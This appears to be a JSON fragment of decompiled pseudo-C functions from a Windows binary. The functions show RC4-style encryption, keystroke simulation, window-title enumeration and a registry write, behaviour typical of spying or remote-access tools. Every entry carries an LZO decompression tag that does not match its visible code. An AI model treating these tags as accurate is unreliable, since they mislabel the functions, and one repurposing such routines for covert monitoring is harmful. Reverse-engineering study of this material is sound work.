        "decompiled_code": "\nvoid __fastcall fcn.00461334(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x46135f;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack1076 = 0x461367;\n    fcn.004059cc();\n    uStack1080 = 0x461601;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406928(iVar4);\n                fcn.00405a3c();\n                fcn.00461120();\n            }\n            else {\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406928(0x100);\n                fcn.00405a3c();\n                fcn.00461120();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.00461334::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.00461334::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.00461334::var_41ch)[uVar3];\n                (&fcn.00461334::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406928(iVar4);\n            fcn.00405a3c();\n            fcn.00461120();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.00461334::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.00461334::var_41ch + uVar3);\n                    (&fcn.00461334::var_41ch)[uVar3] = (&fcn.00461334::var_41ch)[uVar6];\n                    (&fcn.00461334::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.00461334::var_41ch)[uVar3] + (&fcn.00461334::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.00461334::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405c6c();\n            fcn.00405a3c();\n            fcn.00461120();\n            fcn.00461128();\n            fcn.00405584();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x461608;\n    uStack1080 = 0x4615e0;\n    fcn.00405530();\n    uStack1080 = 0x4615f3;\n    fcn.004060f8();\n    uStack1080 = 0x461600;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1503
    },
    "00461610": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461610(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x46163b;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack1076 = 0x461643;\n    fcn.004059cc();\n    uStack1080 = 0x4618dc;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            puStack1076 = &stack0xfffffffc;\n            fcn.004611a8();\n            fcn.004055c8();\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                fcn.00406928(iVar4);\n                fcn.00405a3c();\n                fcn.00461120();\n            }\n            else {\n                fcn.00406928(0x100);\n                fcn.00405a3c();\n                fcn.00461120();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.00461610::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.00461610::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.00461610::var_41ch)[uVar3];\n                (&fcn.00461610::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406928(iVar4);\n            fcn.00405a3c();\n            fcn.00461120();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.00461610::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.00461610::var_41ch + uVar3);\n                    (&fcn.00461610::var_41ch)[uVar3] = (&fcn.00461610::var_41ch)[uVar6];\n                    (&fcn.00461610::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.00461610::var_41ch)[uVar3] + (&fcn.00461610::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.00461610::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405c6c();\n            fcn.00405a3c();\n            fcn.00461120();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x4618e3;\n    uStack1080 = 0x4618bb;\n    fcn.00405530();\n    uStack1080 = 0x4618ce;\n    fcn.004060f8();\n    uStack1080 = 0x4618db;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1495
    },
    "00461940": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00461940(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX & 0xff;\n    if (0x5a < uVar1) {\n        if (uVar1 < 0xa4) {\n            if (uVar1 == 0xa3) goto code_r0x004619ab;\n            if (((uVar1 - 0x5b < 4) || (uVar1 == 0x60)) || (uVar1 - 0x7b < 4)) goto code_r0x004619ca;\n        }\n        else if (((uVar1 == 0xa7) || (uVar1 == 0xb0)) || (uVar1 == 0xb5)) goto code_r0x004619ab;\ncode_r0x004619e5:\n        sub.user32.dll_VkKeyScanA();\n        fcn.00461920();\n        return;\n    }\n    if (uVar1 < 0x2e) {\n        if (uVar1 == 0x23) {\ncode_r0x004619ca:\n            fcn.00461908();\n            sub.user32.dll_VkKeyScanA();\n            fcn.00461920();\n            fcn.00461908();\n            return;\n        }\n        if ((uVar1 != 0x25) && (uVar1 != 0x2b)) goto code_r0x004619e5;\n    }\n    else if ((0xb < uVar1 - 0x2e) && (uVar1 != 0x3f)) {\n        if (uVar1 == 0x40) goto code_r0x004619ca;\n        if (0x19 < uVar1 - 0x41) goto code_r0x004619e5;\n    }\ncode_r0x004619ab:\n    fcn.004618ec();\n    sub.user32.dll_VkKeyScanA();\n    fcn.00461920();\n    fcn.004618ec();\n    return;\n}\n",
        "token_count": 455
    },
    "00462e34": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00462e34(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char *in_EAX;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uchar *in_EDX;\n    int32_t *unaff_EBX;\n    int32_t *unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    uchar uVar5;\n    bool bVar6;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    int32_t *piStack32;\n    uint uStack28;\n    uchar *puStack24;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    iVar4 = 7;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    puStack24 = 0x462e52;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    uStack28 = 0x462fe7;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *in_EDX = 0;\n    var_20h = 0x462e6b;\n    puStack24 = &stack0xfffffffc;\n    fcn.0040700c();\n    var_20h = &fcn.00462e34::var_24h;\n    var_24h = 0x462e77;\n    var_24h = fcn.0040700c();\n    piVar1 = *(arg_8h + -4);\n    iVar4 = (**(*piVar1 + 0xc))(piVar1, 1);\n    if (iVar4 == 0) {\n        *(arg_8h + -8) = *(arg_8h + -8) + 1;\n        fcn.0040700c();\n        uVar2 = fcn.0040700c();\n        iVar4 = (**(*var_ch + 0x24))(var_ch, 0, 0, 0x462ff8, uVar2);\n        if (iVar4 == 0) {\n            iVar4 = (**(*var_10h + 0xc))(var_10h, 0x463008, &fcn.00462e34::var_20h, 0);\n            uVar5 = iVar4 == 0;\n            if (uVar5) {\n                fcn.00414a34();\n                fcn.00409b6c();\n                fcn.004097cc();\n                fcn.00409b6c(1);\n                fcn.004097cc();\n                fcn.00405974();\n                if (uVar5) {\n                    bVar6 = true;\n                }\n                else {\n                    pcVar3 = var_4h;\n                    if (var_4h != NULL) {\n                        pcVar3 = *(var_4h + -4);\n                    }\n                    if (pcVar3 == 0x2) {\n                        bVar6 = *var_4h == '#';\n                    }\n                    else {\n                        bVar6 = false;\n                    }\n                    if (bVar6) {\n                        bVar6 = var_4h[1] - 0x30 == *(arg_8h + -8);\n                    }\n                    else {\n                        bVar6 = false;\n                    }\n                }\n                if (bVar6) {\n                    fcn.00409b6c();\n                    fcn.00405584();\n                    uVar2 = fcn.0040700c();\n                    iVar4 = (**(*var_ch + 0x20))(var_ch, 0, 0, *0x4922b0, uVar2);\n                    *in_EDX = iVar4 == 0;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = piVar1;\n    var_24h = 0x462fee;\n    fcn.00405554();\n    fcn.00411640();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1085
    },
    "00466eac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00466eac(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x466ec8;\n    fcn.004059cc();\n    puStack32 = 0x466ed0;\n    fcn.004059cc();\n    uStack36 = 0x466f35;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack32 = &stack0xfffffffc;\n    if (0 < in_EAX) {\n        do {\n            fcn.00405718();\n            fcn.00405974();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x466f3c;\n    uStack36 = 0x466f34;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 279
    },
    "004695e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004695e8(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff60;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x469759;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405c6c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405c6c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 1) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 2) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 8) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 4) {\n            fcn.004055c8();\n        }\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack76;\n        if ((iVar3 != 0) && (var_4h != 0)) {\n            uVar6 = 0x4697dc;\n            uVar5 = 0x4697dc;\n            uVar4 = 0;\n            uVar2 = var_8h;\n            iVar3 = var_4h;\n            uVar7 = *0x498184;\n            fcn.00409e4c(arg_8h);\n            fcn.004695b4(0x4697dc, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n            fcn.00409d60();\n            in_stack_ffffff60 = 0x4697f8;\n            fcn.004058e0(0x4697f8, 0x4697e8, 0x4697dc, 0);\n            puVar1 = puStack76;\n        }\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405554(0x469760);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 751
    },
    "00469824": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469824(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff64;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x469985;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405c6c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405c6c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 1) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 2) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 8) {\n            fcn.004055c8();\n        }\n        else if (var_2ch == 4) {\n            fcn.004055c8();\n        }\n        uVar6 = 0x469a08;\n        uVar5 = 0x469a08;\n        uVar4 = 0;\n        uVar2 = var_8h;\n        iVar3 = var_4h;\n        uVar7 = *0x498184;\n        fcn.00409e4c(arg_8h);\n        fcn.004695b4(0x469a08, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n        fcn.00409d60();\n        in_stack_ffffff64 = 0x469a24;\n        fcn.004058e0(0x469a24, 0x469a14, 0x469a08, 0);\n        puVar1 = puStack76;\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff64;\n    fcn.00405554(0x46998c);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 701
    },
    "00469a50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00469a50(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uVar4;\n    uint uVar5;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x469b23;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack76;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405c6c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004059dc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405c6c();\n        var_30h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_30h);\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack68;\n        if ((iVar3 != 0) && (var_4h != 0)) {\n            uVar5 = 0x469b3c;\n            uVar4 = 0;\n            iVar3 = var_4h;\n            uVar2 = *0x498184;\n            fcn.00409e4c(arg_8h);\n            in_stack_ffffff80 = 0x469b48;\n            fcn.004058e0(0x469b48, 0, arg_8h, uVar4, uVar5, iVar3, uVar2);\n            puVar1 = puStack68;\n        }\n    }\n    puStack68 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff80;\n    fcn.00405530(0x469b2a);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 518
    },
    "0046a5e4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0046a5e4(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar1;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    uchar *puStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack32 = 0x46a71d;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piStack44 = 0x46a6f6;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00405584();\n    fcn.0045ea34();\n    piVar1 = var_4h;\n    (**(*var_4h + 0x78))(var_4h, &fcn.0046a5e4::var_8h);\n    fcn.0040711c();\n    if (var_8h < 0xf) {\n        if (var_8h == 0xe) {\n            fcn.00405584();\n        }\n        else if (var_8h == 1) {\n            fcn.00405584();\n        }\n        else if (var_8h == 2) {\n            fcn.00405584();\n        }\n        else if (var_8h == 6) {\n            fcn.00405584();\n        }\n        else if (var_8h == 10) {\n            fcn.00405584();\n        }\n    }\n    else if (var_8h == 0x12) {\n        fcn.00405584();\n    }\n    else if (var_8h == 0x22) {\n        fcn.00405584();\n    }\n    else if (var_8h == 0x32) {\n        fcn.00405584();\n    }\n    else if (var_8h == 0x42) {\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = piVar1;\n    *in_FS_OFFSET = piStack44;\n    piStack36 = 0x46a724;\n    puStack40 = 0x46a71c;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 558
    },
    "0046a868": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0046a868(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x46aad0;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046a868::var_24h;\n    var_28h = 0x46a892;\n    fcn.00405530();\n    var_28h = 0x46a89a;\n    var_28h = fcn.0040700c();\n    var_2ch = 0x46a8a8;\n    fcn.0045ea34();\n    var_2ch = var_20h;\n    (**(*var_20h + 0x68))();\n    fcn.0040711c();\n    fcn.00407024();\n    iVar2 = fcn.0040648c(0, var_4h, 0x46aae0);\n    if (-1 < iVar2 + -1) {\n        iVar4 = 0;\n        do {\n            fcn.0040648c(&fcn.0046a868::var_24h, var_4h, 0x46aae8, iVar4);\n            fcn.00407024();\n            fcn.0040648c(&fcn.0046a868::var_28h, var_8h, 0x46aaf4);\n            fcn.004057d4();\n            fcn.0040648c(&fcn.0046a868::var_2ch, var_8h, 0x46aafc);\n            fcn.004057d4();\n            iVar3 = fcn.0040648c(0, var_8h, 0x46ab04);\n            if (iVar3 < 0xf) {\n                if (iVar3 == 0xe) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 1) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 2) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 6) {\n                    fcn.004055c8();\n                }\n                else if (iVar3 == 10) {\n                    fcn.004055c8();\n                }\n            }\n            else if (iVar3 == 0x12) {\n                fcn.004055c8();\n            }\n            else if (iVar3 == 0x22) {\n                fcn.004055c8();\n            }\n            else if (iVar3 == 0x32) {\n                fcn.004055c8();\n            }\n            else if (iVar3 == 0x42) {\n                fcn.004055c8();\n            }\n            iVar1 = fcn.0040648c(0, var_8h, 0x46abb8);\n            if (iVar1 == 0) {\n                fcn.004055c8();\n            }\n            else {\n                fcn.004055c8();\n            }\n            var_2ch = 0x46abec;\n            fcn.004058e0();\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x46aad7;\n    var_28h = 0x46aa9a;\n    fcn.00405d40();\n    var_28h = 0x46aaa2;\n    fcn.0040700c();\n    var_28h = 0x46aaaa;\n    fcn.0040700c();\n    var_28h = 0x46aab2;\n    fcn.0040700c();\n    var_28h = 0x46aabf;\n    fcn.00405554();\n    var_28h = 0x46aac7;\n    fcn.0040700c();\n    var_28h = 0x46aacf;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 1114
    },
    "0046b198": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0046b198(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_15ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_178h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack384 = 0x46b1c9;\n    fcn.00405fe8();\n    uStack388 = 0x46b2ff;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    puStack396 = 0x46b1e2;\n    puStack384 = &stack0xfffffffc;\n    fcn.00405530();\n    puStack396 = 0x46b1ea;\n    fcn.0046b0fc();\n    puStack396 = 0x46b1f7;\n    fcn.00405818();\n    puStack396 = 0x46b1ff;\n    cVar1 = fcn.0040a280();\n    if (cVar1 != '\\0') {\n        puStack396 = 0x46b212;\n        fcn.0040e820();\n        puStack396 = 0x46b21d;\n        fcn.004055c8();\n        puStack396 = 0x46b230;\n        fcn.00405864();\n        puStack396 = 0x46b246;\n        iVar2 = fcn.0040a478();\n        if (iVar2 == 0) {\n            uStack400 = 0x46b29b;\n            *in_FS_OFFSET = &stack0xfffffe6c;\n            puStack396 = &stack0xfffffffc;\n            do {\n                uStack404 = 0x46b33c;\n                fcn.004058e0();\n                iVar2 = fcn.0040a4c8();\n            } while (iVar2 == 0);\n            *in_FS_OFFSET = uStack404;\n            fcn.0040a4ec(0x46b2a2);\n            return;\n        }\n        puStack396 = 0x46b2ba;\n        fcn.00405a84();\n        puStack396 = 0x46b2c8;\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x46b306;\n    uStack388 = 0x46b2e0;\n    fcn.00405530();\n    uStack388 = 0x46b2f1;\n    fcn.004060ac();\n    uStack388 = 0x46b2fe;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 680
    },
    "0046b654": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b654(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x46b66c;\n    fcn.004059cc();\n    puStack28 = 0x46b674;\n    fcn.004059cc();\n    puStack28 = 0x46b67c;\n    fcn.004059cc();\n    uStack32 = 0x46b6fd;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004059dc(&fcn.0046b654::hKey);\n    sub.advapi32.dll_RegCreateKeyA();\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar1 = fcn.004059dc(arg_8h);\n    uVar1 = fcn.004059dc(0, 2, uVar1);\n    sub.advapi32.dll_RegSetValueExA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x46b704);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 339
    },
